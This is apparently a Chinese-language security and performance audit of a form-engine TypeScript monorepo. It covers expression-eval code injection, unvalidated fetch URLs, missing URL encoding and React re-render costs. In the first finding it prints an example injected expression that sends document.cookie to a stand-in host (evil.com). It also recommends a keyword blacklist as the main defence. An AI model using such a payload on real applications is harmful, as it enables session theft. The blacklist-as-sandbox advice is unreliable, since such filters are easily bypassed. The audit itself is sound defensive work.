# 代码安全与性能审查报告

## 审查范围

对整个 `form-engine` monorepo 的核心代码进行安全漏洞和性能问题审查，重点关注：

* `packages/core/src/` — 核心包（类型、渲染器、设计器、事件、数据源、样式、工具）

* `packages/adapter-antd/src/` — Ant Design 适配器

* `packages/adapter-antd-mobile/src/` — Ant Design Mobile 适配器

***

## 一、安全漏洞

### 🔴 高危

#### 1. `evalExpr` 使用 `new Function()` 执行任意代码 — 代码注入风险

**文件**: [utils/index.ts](file:///d:/Repos/form_engine/packages/core/src/utils/index.ts#L30-L39)

```typescript
export function evalExpr(expr: string, context: Record<string, unknown>): unknown {
  try {
    const keys = Object.keys(context)
    const values = Object.values(context)
    const fn = new Function(...keys, `return (${expr})`)
    return fn(...values)
  } catch { ... }
}
```

**问题**: `new Function(..., "return (" + expr + ")")` 本质等同于 `eval()`。攻击者若能控制 schema 中的表达式字符串（如 `disabledIfExpr`、`visibleIfExpr`、`requiredIfExpr`、事件 `expression`），可注入任意 JavaScript：

```javascript
// 攻击示例：通过 visibleIfExpr 注入
"(() => { fetch('https://evil.com?c=' + document.cookie); return true; })()"
```

**影响范围**（共 6 处调用）:

* [useVisibility.ts](file:///d:/Repos/form_engine/packages/core/src/renderer/hooks/useVisibility.ts#L18-L21) — `hidden`、`visibleIfExpr`

* [useFieldExpression.ts](file:///d:/Repos/form_engine/packages/core/src/renderer/hooks/useFieldExpression.ts#L25-L31) — `disabled`、`disabledIfExpr`、`requiredIfExpr`

* [events/resolver.ts](file:///d:/Repos/form_engine/packages/core/src/events/resolver.ts#L54) — 事件表达式

**建议**:

* 在 `evalExpr` 内部对表达式字符串做黑名单校验，禁止 `fetch`、`document`、`window`、`XMLHttpRequest`、`import`、`eval` 等危险全局变量和 API 的访问。注意：不能禁止 `()` 和 `{}`，因为表达式需要支持函数调用（如 `$form.getFieldValue()`）和对象字面量

***

#### 2. 远程数据源 URL 缺少校验

**文件**: [dataSource/resolver.ts](file:///d:/Repos/form_engine/packages/core/src/dataSource/resolver.ts#L112-L138)

```typescript
const url = replaceTemplateVars(String(config.url || ''), formValues)
const resp = await fetch(url, fetchOptions)
```

**问题**:

* `config.url` 完全由 schema 控制，无任何校验，可能指向外部域名
* 浏览器 `fetch` 受同源策略限制，通常无法跨域；第三方 API 一般通过 SDK 函数调用而非直接请求 URL。如果确实需要访问外部 API，使用者应自行搭建后端代理
* 因此，`config.url` 应限定为 **同源相对路径**

**建议**:

* `config.url` 必须以 `/` 开头（仅允许同源相对路径），否则拒绝请求
* `replaceTemplateVars` 中的变量值应做 `encodeURIComponent`

***

#### 3. `replaceTemplateVars` 缺少 URL 编码

**文件**: [utils/index.ts](file:///d:/Repos/form_engine/packages/core/src/utils/index.ts#L16-L24)

```typescript
return template.replace(/\{([^}]+)\}/g, (_, path) => {
  const val = getNested(context, path)
  return val != null ? String(val) : ''
})
```

**问题**: 模板变量值直接拼接到 URL 中，未做 `encodeURIComponent`。例如 `deptName` 值为 `A&B` 时，会破坏 URL 结构。

**建议**: 返回值改为 `encodeURIComponent(String(val))`

***

### 🟡 中危

#### 4. `invokeAction` 动态属性访问可绕过白名单

**文件**: [events/actions.ts](file:///d:/Repos/form_engine/packages/core/src/events/actions.ts#L65-L103)

```typescript
const method = ($form as unknown as Record<string, ...>)[name]
```

**问题**: 虽然有 `getActionDef(name)` 做白名单检查，但 `switch` 的 `default` 分支（L99-101）可以调用 `$form` 上的任意方法。如果未来白名单新增了危险方法，容易被利用。

**建议**: 移除 `default` 分支，仅允许 `switch` 中明确列出的 action。

***

#### 5. `JSON.parse` 无异常处理导致属性面板崩溃

**文件**: [propertySlotRegistry.tsx](file:///d:/Repos/form_engine/packages/core/src/registry/propertySlotRegistry.tsx#L103-L108)

```tsx
try {
  onChange(JSON.parse(e.target.value))
} catch {
  onChange(e.target.value)  // 解析失败时透传原始字符串
}
```

**问题**: `JSON.parse` 失败时 fallback 到原始字符串，导致组件收到非预期类型的值，可能引发后续渲染错误。虽然有 try-catch，但 fallback 策略不够健壮。

**建议**: 解析失败时保持旧值不变，或给出用户提示。

***

### 🟢 低危

#### 6. `console.warn` 在生产环境泄露调试信息

**文件**: 多处使用 `console.warn` 和 `console.error`

**问题**: 生产环境仍会输出 `[form-engine]` 前缀的调试信息，可能暴露内部逻辑。

**建议**: 引入统一的 logger 模块，支持生产环境静默。

***

#### 7. CSS 变量注入未做值校验

**文件**: [injectCss.ts](file:///d:/Repos/form_engine/packages/core/src/styles/injectCss.ts#L31-L37)

```typescript
target.style.setProperty(key, value)
```

**问题**: 如果用户通过 `theme` prop 传入恶意 CSS 值（如包含 `url()` 或 `expression()`），可能造成 CSS 注入。

**建议**: 对 CSS 变量值做基本校验，过滤 `url()`、`expression()` 等危险模式。

***

## 二、性能问题

### 🔴 高影响

#### 1. `evalExpr` 每次调用创建新 Function — 高频场景下性能差

**文件**: [utils/index.ts](file:///d:/Repos/form_engine/packages/core/src/utils/index.ts#L34)

```typescript
const fn = new Function(...keys, `return (${expr})`)
```

**问题**: `new Function()` 触发 JavaScript 引擎编译，开销远大于普通函数调用。在 `useVisibility` 和 `useFieldExpression` 中每次 formValues 变化都会重新执行，表单字段多时性能影响显著。

**建议**: 对表达式做 LRU 缓存，相同表达式字符串复用编译结果。

***

#### 2. `useVisibility` 每次 formValues 变化全量过滤所有字段

**文件**: [useVisibility.ts](file:///d:/Repos/form_engine/packages/core/src/renderer/hooks/useVisibility.ts#L13-L28)

```typescript
const visibleFields = useMemo(
  () => formSchema.fields.filter((field) => { ... }),
  [formSchema.fields, formValues],
)
```

**问题**: 任何一个字段值变化，都会重新 `filter` 所有字段并执行 `evalExpr`。100 个字段、每个字段变化都触发全量计算。

**建议**:

* 将 `formValues` 依赖改为只监听 `visibleWhen`/`visibleIfExpr` 中实际引用的字段

* 或对表达式求值结果做缓存，只在相关字段变化时重算

***

#### 3. `eventContext` 随 formValues 变化导致所有 FieldRenderer 重渲染

**文件**: [useFormRender.ts](file:///d:/Repos/form_engine/packages/core/src/renderer/hooks/useFormRender.ts#L133-L136)

```typescript
const eventContext: EventContext = useMemo(
  () => ({ formValues, $form, callbacks }),
  [formValues, $form, callbacks],
)
```

**问题**: `eventContext` 包含 `formValues`，每次字段值变化都会重建。它通过 `FormStateContext` 传递给所有 `NestedFieldRenderer`，导致所有字段组件重渲染，即使只有 1 个字段值变化。

**建议**: `eventContext.formValues` 改为 `formValuesRef`（ref 引用），避免触发不必要的重渲染。

***

#### 4. `useDataSource` 每次 formValues 变化遍历所有字段

**文件**: [useDataSource.ts](file:///d:/Repos/form_engine/packages/core/src/renderer/hooks/useDataSource.ts#L93-L102)

```typescript
useEffect(() => {
  formSchema.fields.forEach((field) => {
    if (!field.dataSource || field.dataSource.type !== 'remote') return
    // ...
  })
}, [formValues, formSchema.fields, loadDataSource])
```

**问题**: 每次 `formValues` 变化遍历所有字段检查远程数据源依赖。结合 debounce 和缓存，虽不会多发请求，但遍历本身在大表单中也有开销。

**建议**: 维护一个 `Map<fieldName, deps[]>` 在初始化时构建，后续只遍历依赖真正变化的字段。

***

### 🟡 中影响

#### 5. `cloneField` 的 `structuredClone` 在撤销/重做中的内存开销

**文件**: [fieldOperations.ts](file:///d:/Repos/form_engine/packages/core/src/designer/reducer/fieldOperations.ts#L24-L34)

```typescript
export function cloneField(field: FormFieldSchema): FormFieldSchema {
  return {
    ...structuredClone(field),
    id: generateFieldId(),
    children: field.children.map(cloneField),
  }
}
```

**问题**: 撤销/重做最多保存 50 个快照，每个快照用 `structuredClone` 深拷贝整个字段树。大表单（如 200+ 字段）内存占用可达数十 MB。

**建议**: 考虑使用不可变数据结构（如 Immer）做结构共享，或限制快照数量为 20。

***

#### 6. `removeFieldFromTree` 和 `updateFieldInTree` 全树遍历

**文件**: [fieldOperations.ts](file:///d:/Repos/form_engine/packages/core/src/designer/reducer/fieldOperations.ts#L36-L89)

```typescript
export function removeFieldFromTree(fields, parentId, index) {
  if (parentId) {
    return fields.map(n => { ... })  // 遍历所有顶层节点
  }
}
```

**问题**: 即使已知 `parentId`，仍遍历所有顶层节点。应使用 `buildFieldIndex` 快速定位父节点。

**建议**: 在 reducer 中复用 `FieldIndex` 做 O(1) 查找，减少不必要的树遍历。

***

#### 7. `useMemo` 依赖 `formSchema.fields` 引用不稳定

**文件**: [useVisibility.ts](file:///d:/Repos/form_engine/packages/core/src/renderer/hooks/useVisibility.ts#L28) 和 [useDataSource.ts](file:///d:/Repos/form_engine/packages/core/src/renderer/hooks/useDataSource.ts#L102)

```typescript
[formSchema.fields, formValues]
```

**问题**: `formSchema.fields` 作为依赖时，如果 `formSchema` 本身每次渲染都是新对象，会导致 memo 失效，即使 fields 内容未变。

**建议**: 使用 `formSchema.fields` 的引用稳定化策略，或单独提取 fields 为独立 prop。

***

### 🟢 低影响

#### 8. `useMemo` 传递函数 `formSchema` 无实际缓存效果

**文件**: [useFormRender.ts](file:///d:/Repos/form_engine/packages/core/src/renderer/hooks/useFormRender.ts#L49)

```typescript
const formSchema = useMemo(() => schema, [schema])
```

**问题**: 这行代码只是原样返回 `schema`，没有实际计算，`useMemo` 开销大于收益。

**建议**: 直接使用 `schema`，删除此 `useMemo`。

***

#### 9. `PropertyPanel` 中的 `JSON.stringify` 高频调用

**文件**: [propertySlotRegistry.tsx](file:///d:/Repos/form_engine/packages/core/src/registry/propertySlotRegistry.tsx#L103)

```tsx
value={typeof value === 'string' ? value : JSON.stringify(value, null, 2)}
```

**问题**: 每次渲染都执行 `JSON.stringify`，如果 value 是大对象，会有性能开销。但属性面板通常不频繁渲染，影响较小。

***

## 三、总结

| 类别   | 高危 | 中危 | 低危 | 合计 |
| ---- | -- | -- | -- | -- |
| 安全漏洞 | 3  | 2  | 2  | 7  |
| 性能问题 | 4  | 3  | 2  | 9  |

### 优先修复建议

1. **立即修复**: `evalExpr` 添加 `fetch`/`document`/`window` 等危险 API 黑名单校验（安全 #1）
2. **尽快修复**: 远程数据源 URL 限定 `/` 开头 + URL 编码（安全 #2 + #3）
3. **计划修复**: `eventContext` 导致的全量重渲染（性能 #3）+ `useVisibility` 全量过滤（性能 #2）
4. **后续优化**: 其余中低影响项

***

## 四、验证步骤

1. 运行现有测试确保无回归：`pnpm test`
2. 运行类型检查：`pnpm --filter @form-engine/core type-check`
3. 运行 lint：`pnpm lint`
4. 构建验证：`pnpm build`

---

## 五、修复状态

| # | 项目 | 状态 | 修改文件 |
|---|------|------|----------|
| 安全 #1 | evalExpr 黑名单 + LRU 缓存 | ✅ 已完成 | `packages/core/src/utils/index.ts` |
| 安全 #2 | URL 限定 `/` 开头 | ✅ 已完成 | `packages/core/src/dataSource/resolver.ts` |
| 安全 #3 | replaceTemplateVars URL 编码 | ✅ 已完成 | `packages/core/src/utils/index.ts` |
| 性能 #3 | eventContext 用 formValuesRef | ✅ 已完成 | `packages/core/src/renderer/hooks/useFormRender.ts` |

